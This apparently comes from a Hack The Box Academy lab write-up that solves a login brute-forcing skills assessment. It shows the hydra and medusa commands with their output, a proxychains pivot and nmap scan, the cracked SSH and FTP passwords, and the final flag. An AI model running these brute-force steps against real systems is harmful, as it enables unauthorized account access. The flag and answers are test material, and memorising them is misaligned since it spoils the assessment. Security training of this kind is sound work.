# Section 13: Skills Assessment Part 2

Module: 16. Login Brute Forcing

---

## Questions & Answers

### 1. What is the username of the ftp user you find via brute-forcing?

Context:
- Brute force the SSH credentials:
```bash
┌─[htb-ac-2162140@htb-wzjtvp0jkj-htb-cloud-com]─[~]
└──╼ [★]$ hydra -l satwossh -P 2023-200_most_used_passwords.txt -s 30654 -u 154.57.164.82 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 06:45:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking ssh://154.57.164.82:30654/
[30654][ssh] host: 154.57.164.82   login: satwossh   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 12 final worker threads did not complete until end.
[ERROR] 12 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-07 06:45:52
```
- Pivoting and nmap the services:
```bash
proxychains nmap 10.244.45.165

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```
- Inside `satwossh` found 3 files:
```bash
Security Operations Teamsatwossh@ng-2162140-loginbfsatwo-p0vvt-56968b5c9c-2f4mq:~$ ls
IncidentReport.txt  passwords.txt  username-anarchy
satwossh@ng-2162140-loginbfsatwo-p0vvt-56968b5c9c-2f4mq:~$ cat IncidentReport.txt 
System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.
```
- Found user `Thomas Smith`, create custom wordlists and brute-force his password with the provided `passwords.txt`:
```bash
satwossh@ng-2162140-loginbfsatwo-p0vvt-56968b5c9c-2f4mq:~/username-anarchy$ ./username-anarchy Thomas Smith > thomas_smith_usernames.txt

┌─[htb-ac-2162140@htb-wzjtvp0jkj-htb-cloud-com]─[~]
└──╼ [★]$ proxychains medusa -M ftp -h 10.244.45.165 -U thomas_smith_usernames.txt -P passwords.txt 
<SNIP>
2026-09-07 06:59:45 ACCOUNT FOUND: [ftp] Host: 10.244.45.165 User: thomas Password: chocolate! [SUCCESS]
<SNIP>
```

**Answer:** `thomas`

---

### 2. What is the flag contained within flag.txt

Context:
```bash
┌─[htb-ac-2162140@htb-wzjtvp0jkj-htb-cloud-com]─[~]
└──╼ [★]$ proxychains ftp 10.244.45.165
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  10.244.45.165:21  ...  OK
Connected to 10.244.45.165.
220 (vsFTPd 3.0.5)
Name (10.244.45.165:root): thomas
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43060|)
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  10.244.45.165:43060  ...  OK
150 Here comes the directory listing.
-rw-------    1 1001     1001           28 Sep 10  2024 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||44411|)
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  10.244.45.165:44411  ...  OK
150 Opening BINARY mode data connection for flag.txt (28 bytes).
100% |*************************************************************************************************************************************************|    28      525.84 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (0.67 KiB/s)
ftp> !cat flag.txt
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
HTB{brut3f0rc1ng_succ3ssful}
```

**Answer:** `HTB{brut3f0rc1ng_succ3ssful}`

---

[Back to Module Index](./README.md)
